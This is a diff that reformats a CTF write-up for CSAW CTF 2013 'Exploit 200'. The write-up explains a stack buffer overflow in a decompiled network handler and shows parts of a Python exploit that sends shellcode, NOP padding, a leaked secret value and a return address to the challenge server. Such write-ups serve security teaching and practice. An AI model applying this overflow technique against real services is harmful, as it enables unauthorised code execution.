@@ -4,7 +4,9 @@ title:  "CSAW CTF 2013 - Exploit 200"
 ---
 
 Source were not provided, but with IDA and Hex-Ray we can get the following pseudocode:
-```
+
+```c
+
 int __cdecl handle(int fd)
 {
   int result; // eax@1
@@ -37,6 +39,7 @@ int __cdecl handle(int fd)
   }
   return result;
 }
+
 ```
 
 First thing to note is that `recv` read `0x1000` bytes of data into a buffer of `0x800`. We can use this to rewrite stack data. The overflow is big enough to rewrite the return address.
@@ -49,7 +52,8 @@ The last thing to note is the `secret` variable. It is use to hold a random numb
 
 Our final exploit code was the following:
 
-```
+```python
+
 shellcode = ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('128.238.66.212', 31338))
@@ -62,4 +66,5 @@ s.recv(1024)
 payload = shellcode + '\x90' * (buf_size-len(shellcode)) + secret + '\x90' * 12 + buf_addr
 
 s.send(payload)
+
 ```
